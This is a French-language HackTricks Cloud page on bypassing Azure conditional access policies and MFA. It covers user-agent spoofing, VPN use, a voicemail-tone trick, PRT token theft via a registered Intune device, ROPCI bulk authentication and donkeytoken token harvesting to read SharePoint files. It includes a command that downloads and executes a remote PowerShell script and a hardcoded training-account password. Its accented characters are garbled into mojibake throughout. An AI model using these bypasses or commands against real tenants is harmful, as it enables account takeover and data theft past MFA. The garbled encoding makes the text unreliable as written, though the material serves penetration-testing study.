# Az - Politiques d'acc√®s conditionnel & Contournement MFA

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**Formation HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**Formation HackTricks GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}

## Informations de base

Les politiques d'acc√®s conditionnel Azure sont des r√®gles √©tablies dans Microsoft Azure pour appliquer des contr√¥les d'acc√®s aux services et applications Azure en fonction de certaines **conditions**. Ces politiques aident les organisations √† s√©curiser leurs ressources en appliquant les bons contr√¥les d'acc√®s dans les bonnes circonstances.\
Les politiques d'acc√®s conditionnel **d√©finissent** essentiellement **Qui** peut acc√©der √† **Quoi** depuis **O√π** et **Comment**.

Voici quelques exemples :

1. **Politique de risque de connexion** : Cette politique pourrait √™tre configur√©e pour exiger une authentification multifacteur (MFA) lorsqu'un risque de connexion est d√©tect√©. Par exemple, si le comportement de connexion d'un utilisateur est inhabituel par rapport √† son mod√®le r√©gulier, comme se connecter depuis un pays diff√©rent, le syst√®me peut demander une authentification suppl√©mentaire.
2. **Politique de conformit√© des appareils** : Cette politique peut restreindre l'acc√®s aux services Azure uniquement aux appareils conformes aux normes de s√©curit√© de l'organisation. Par exemple, l'acc√®s pourrait √™tre autoris√© uniquement depuis des appareils ayant un logiciel antivirus √† jour ou ex√©cutant une certaine version du syst√®me d'exploitation.

## Contournements des politiques d'acc√®s conditionnel

Il est possible qu'une politique d'acc√®s conditionnel **v√©rifie certaines informations qui peuvent √™tre facilement falsifi√©es, permettant un contournement de la politique**. Et si, par exemple, la politique √©tait configur√©e pour MFA, l'attaquant pourra la contourner.

Lors de la configuration d'une politique d'acc√®s conditionnel, il est n√©cessaire d'indiquer les **utilisateurs** concern√©s et les **ressources cibles** (comme toutes les applications cloud).

Il est √©galement n√©cessaire de configurer les **conditions** qui **d√©clencheront** la politique :

* **R√©seau** : IP, plages IP et emplacements g√©ographiques
* Peut √™tre contourn√© en utilisant un VPN ou un Proxy pour se connecter √† un pays ou en r√©ussissant √† se connecter depuis une adresse IP autoris√©e
* **Risques Microsoft** : Risque utilisateur, risque de connexion, risque interne
* **Plateformes d'appareils** : Tout appareil ou s√©lectionner Android, iOS, Windows phone, Windows, macOS, Linux
* Si "Tout appareil" n'est pas s√©lectionn√© mais que toutes les autres options sont s√©lectionn√©es, il est possible de le contourner en utilisant un user-agent al√©atoire non li√© √† ces plateformes
* **Applications clientes** : Les options sont "Navigateur", "Applications mobiles et clients de bureau", "Clients Exchange ActiveSync" et "Autres clients"
* Pour contourner la connexion avec une option non s√©lectionn√©e
* **Filtrer par appareils** : Il est possible de g√©n√©rer une r√®gle li√©e √† l'appareil utilis√©
* **Flux d'authentification** : Les options sont "Flux de code d'appareil" et "Transfert d'authentification"
* Cela n'affectera pas un attaquant √† moins qu'il n'essaie d'abuser de l'un de ces protocoles dans une tentative de phishing pour acc√©der au compte de la victime

Les **r√©sultats** possibles sont : Bloquer ou Accorder l'acc√®s avec des conditions potentielles comme exiger MFA, appareil conforme‚Ä¶

### Plateformes d'appareils - Condition d'appareil

Il est possible de d√©finir une condition bas√©e sur la **plateforme d'appareil** (Android, iOS, Windows, macOS...), cependant, cela est bas√© sur le **user-agent** donc il est facile de contourner. M√™me **en rendant toutes les options obligatoires pour MFA**, si vous utilisez un **user-agent qui n'est pas reconnu,** vous pourrez contourner le MFA ou le blocage :

<figure><img src="../../../.gitbook/assets/image (352).png" alt=""><figcaption></figcaption></figure>

Il suffit de faire en sorte que le navigateur **envoie un user-agent inconnu** (comme `Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920) UCBrowser/10.1.0.563 Mobile`) pour ne pas d√©clencher cette condition.\
Vous pouvez changer le user agent **manuellement** dans les outils de d√©veloppement :

<figure><img src="../../../.gitbook/assets/image (351).png" alt="" width="375"><figcaption></figcaption></figure>

&#x20;Ou utiliser une [extension de navigateur comme celle-ci](https://chromewebstore.google.com/detail/user-agent-switcher-and-m/bhchdcejhohfmigjafbampogmaanbfkg?hl=en).

### Emplacements : Pays, plages IP - Condition d'appareil

Si cela est d√©fini dans la politique conditionnelle, un attaquant pourrait simplement utiliser un **VPN** dans le **pays autoris√©** ou essayer de trouver un moyen d'acc√©der depuis une **adresse IP autoris√©e** pour contourner ces conditions.

### Applications Cloud

Il est possible de configurer des **politiques d'acc√®s conditionnel pour bloquer ou forcer** par exemple MFA lorsqu'un utilisateur essaie d'acc√©der √† une **application sp√©cifique** :

<figure><img src="../../../.gitbook/assets/image (353).png" alt=""><figcaption></figcaption></figure>

Pour essayer de contourner cette protection, vous devriez voir si vous pouvez **vous connecter uniquement √† une application**.\
L'outil [**AzureAppsSweep**](https://github.com/carlospolop/AzureAppsSweep) a **des dizaines d'ID d'application cod√©s en dur** et essaiera de se connecter √† eux et vous informera et vous donnera m√™me le token si cela r√©ussit.

Pour **tester des ID d'application sp√©cifiques dans des ressources sp√©cifiques**, vous pourriez √©galement utiliser un outil tel que :

{% code overflow="wrap" %}
```bash
roadrecon auth -u user@email.com -r https://outlook.office.com/ -c 1fec8e78-bce4-4aaf-ab1b-5451cc387264 --tokens-stdout

<token>
```
{% endcode %}

De plus, il est √©galement possible de prot√©ger la m√©thode de connexion (par exemple, si vous essayez de vous connecter depuis le navigateur ou depuis une application de bureau). L'outil [**Invoke-MFASweep**](az-conditional-access-policies-mfa-bypass.md#invoke-mfasweep) effectue certaines v√©rifications pour essayer de contourner ces protections √©galement.

L'outil [**donkeytoken**](az-conditional-access-policies-mfa-bypass.md#donkeytoken) pourrait √©galement √™tre utilis√© √† des fins similaires bien qu'il semble non maintenu.

L'outil [**ROPCI**](https://github.com/wunderwuzzi23/ropci) peut √©galement √™tre utilis√© pour tester ces protections et voir s'il est possible de contourner les MFA ou les blocages, mais cet outil fonctionne d'une perspective **whitebox**. Vous devez d'abord t√©l√©charger la liste des applications autoris√©es dans le locataire, puis il essaiera de se connecter √† celles-ci.

## Autres contournements de MFA Az

### Sonnerie

Une option Azure MFA est de **recevoir un appel au num√©ro de t√©l√©phone configur√©** o√π il sera demand√© √† l'utilisateur de **envoyer le caract√®re `#`**.

{% hint style="danger" %}
Comme les caract√®res ne sont que des **tons**, un attaquant pourrait **compromettre** le message de **messagerie vocale** du num√©ro de t√©l√©phone, configurer comme message le **ton de `#`** et ensuite, lors de la demande de MFA, s'assurer que le **t√©l√©phone de la victime est occup√©** (en l'appelant) afin que l'appel Azure soit redirig√© vers la messagerie vocale.
{% endhint %}

### Appareils conformes

Les politiques demandent souvent un appareil conforme ou MFA, donc un **attaquant pourrait enregistrer un appareil conforme**, obtenir un **jeton PRT** et **contourner ainsi le MFA**.

Commencez par enregistrer un **appareil conforme dans Intune**, puis **obtenez le PRT** avec :
```powershell
$prtKeys = Get-AADIntuneUserPRTKeys - PfxFileName .\<uuid>.pfx -Credentials $credentials

$prtToken = New-AADIntUserPRTToken -Settings $prtKeys -GertNonce

Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken

<token returned>
```
Trouvez plus d'informations sur ce type d'attaque dans la page suivante :

{% content-ref url="../az-lateral-movement-cloud-on-prem/pass-the-prt.md" %}
[pass-the-prt.md](../az-lateral-movement-cloud-on-prem/pass-the-prt.md)
{% endcontent-ref %}

## Outils

### [**AzureAppsSweep**](https://github.com/carlospolop/AzureAppsSweep)

Ce script r√©cup√®re des identifiants d'utilisateur et v√©rifie s'il peut se connecter √† certaines applications.

Ceci est utile pour voir si vous **n'√™tes pas oblig√© de MFA pour vous connecter √† certaines applications** que vous pourriez ensuite abuser pour **escalader les privil√®ges**.

### [roadrecon](https://github.com/dirkjanm/ROADtools)

Obtenez toutes les politiques.
```bash
roadrecon plugin policies
```
### [Invoke-MFASweep](https://github.com/dafthack/MFASweep)

MFASweep est un script PowerShell qui tente de **se connecter √† divers services Microsoft en utilisant un ensemble de credentials fournis et essaiera d'identifier si MFA est activ√©**. Selon la fa√ßon dont les politiques d'acc√®s conditionnel et d'autres param√®tres d'authentification multi-facteurs sont configur√©s, certains protocoles peuvent finir par √™tre laiss√©s en facteur unique. Il dispose √©galement d'une v√©rification suppl√©mentaire pour les configurations ADFS et peut tenter de se connecter au serveur ADFS sur site s'il est d√©tect√©.
```bash
Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/dafthack/MFASweep/master/MFASweep.ps1").Content
Invoke-MFASweep -Username <username> -Password <pass>
```
### [ROPCI](https://github.com/wunderwuzzi23/ropci)

Cet outil a aid√© √† identifier les contournements MFA et √† abuser des API dans plusieurs locataires AAD de production, o√π les clients AAD croyaient avoir MFA appliqu√©, mais l'authentification bas√©e sur ROPC a r√©ussi.

{% hint style="success" %}
Vous devez avoir les autorisations pour lister toutes les applications afin de pouvoir g√©n√©rer la liste des applications √† brute-forcer.
{% endhint %}
```bash
./ropci configure
./ropci apps list --all --format json -o apps.json
./ropci apps list --all --format json | jq -r '.value[] | [.displayName,.appId] | @csv' > apps.csv
./ropci auth bulk -i apps.csv -o results.json
```
### [donkeytoken](https://github.com/silverhack/donkeytoken)

Donkey token est un ensemble de fonctions qui visent √† aider les consultants en s√©curit√© qui doivent valider les politiques d'acc√®s conditionnel, tester les portails Microsoft avec 2FA activ√©, etc..

<pre class="language-powershell"><code class="lang-powershell"><strong>git clone https://github.com/silverhack/donkeytoken.git
</strong><strong>Import-Module '.\donkeytoken' -Force
</strong></code></pre>

**Testez chaque portail** s'il est possible de **se connecter sans MFA** :
```powershell
$username = "conditional-access-app-user@azure.training.hacktricks.xyz"
$password = ConvertTo-SecureString "Poehurgi78633" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)
Invoke-MFATest -credential $cred -Verbose -Debug -InformationAction Continue
```
Parce que le **portail** **Azure** **n'est pas contraint**, il est possible de **rassembler un jeton √† partir de l'endpoint du portail pour acc√©der √† tout service d√©tect√©** par l'ex√©cution pr√©c√©dente. Dans ce cas, Sharepoint a √©t√© identifi√©, et un jeton pour y acc√©der est demand√© :

{% code overflow="wrap" %}
```powershell
$token = Get-DelegationTokenFromAzurePortal -credential $cred -token_type microsoft.graph -extension_type Microsoft_Intune
Read-JWTtoken -token $token.access_token
```
{% endcode %}

Supposons que le jeton ait la permission Sites.Read.All (de Sharepoint), m√™me si vous ne pouvez pas acc√©der √† Sharepoint depuis le web en raison de MFA, il est possible d'utiliser le jeton pour acc√©der aux fichiers avec le jeton g√©n√©r√© :
```powershell
$data = Get-SharePointFilesFromGraph -authentication $token $data[0].downloadUrl
```
## R√©f√©rences

* [https://www.youtube.com/watch?v=yOJ6yB9anZM\&t=296s](https://www.youtube.com/watch?v=yOJ6yB9anZM\&t=296s)
* [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Formation Expert Red Team AWS (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Formation Expert Red Team GCP (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
